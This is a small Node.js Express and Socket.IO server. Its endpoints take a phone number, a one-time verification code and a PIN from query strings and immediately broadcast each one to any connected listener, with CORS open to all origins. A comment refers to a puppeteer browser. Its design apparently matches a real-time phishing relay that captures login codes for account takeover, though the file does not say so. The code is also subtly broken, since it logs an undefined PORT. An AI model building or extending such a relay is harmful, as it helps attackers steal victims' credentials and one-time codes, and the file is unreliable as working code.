const fs = require('fs');

const cheerio = require('cheerio');

const path = require('path');
const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server, {
    cors: {
        origin: '*',
    }
})

const cors = require('cors');

app.use(cors({
    origin: '*'
}));

io.on("connection", (socket) => {
    console.log('a user connected');
});

io.on('data', (data) => {
    console.log(data);
});

// global puppeteer browser instance

let data = {
    'start': '',
    'phone': '',
    'code': '',
    'pin': ''
}

app.get('/login', async (req, res) => {
    io.emit('data', {
        'message': 'started login flow'
    });

    res.json({
        message: 'started login flow'
    });
});

app.get('/phone', async (req, res) => {

    io.emit('data',{
        'message': 'phone',
        'phone': req.query.phone
    })

    res.json({
        message: 'phone number inputted'
    });
});

app.get('/code', async (req, res) => {
    io.emit('data',{
        'message': 'code',
        'code': req.query.code
    })

    res.json({
        message: 'code inputted'
    })
});

app.get('/pin', async (req, res) => {
    io.emit('pin',{
        'message': 'pin',
        'pin': req.query.pin
    })

    res.json({
        message: 'pin inputted'
    });
});


server.listen(5000, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
})